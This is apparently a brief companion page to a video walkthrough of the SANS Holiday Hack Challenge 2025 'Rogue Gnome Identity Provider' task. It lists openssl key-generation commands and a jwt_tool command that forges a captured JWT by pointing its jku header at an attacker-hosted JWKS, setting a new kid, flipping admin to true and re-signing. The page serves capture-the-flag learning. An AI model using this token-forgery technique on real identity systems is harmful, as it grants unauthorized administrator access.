Rogue Gnome Identity Provider - JWKS spoofing - SANS Holiday Hack Challenge 2025

[SANS Holiday Hack Challenge 2025 - link](https://www.sans.org/cyber-ranges/holiday-hack-challenge#play)

[Rogue Gnome Identity Provider - Full Walkthrough 2025](https://youtu.be/AWEcumWFnHs)

**Below commands used on Farewell video:**

```
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem
```

```
jwt_tool.py "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTA5NjgwNCwiZXhwIjoxNzY1MTA0MDA0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.AQfFSsWpmMJkPobGNA_y5gckVOHpJKdYi9yvwxT2byYSMEJSQ48dwrK5qFhgRSHVcBD_A8dUqWWNR57R5lgP_i5Q3M5WcEz-SEC69NffXnssKdlsJIB_tS8oq2khdd77ATldTPZzNil5TbszTm4bcV6G7N3HxQyeOOtQNKo6jJhqHl4USiCY6m264OIvSCbD1-1z8v7MxfpB51W6hlKgNP7JAjC64W2i8Pk7aj0CIT48je1oHbEDFJ7Zrf4x2Ge92zzZJ-hdwplt9acQey0BgGWlTnUcLl3aLB8iMSYiXVNndeUyaewvKVFXSAQdKfHdkvSMZ7hO6mrXVQoQx-ZoVg" \
  -I -hc jku -hv "http://paulweb.neighborhood/jwks.json" \
     -hc kid -hv "evil-key-1" \
     -pc admin -pv true \
  -S rs256 -pr private.pem
```
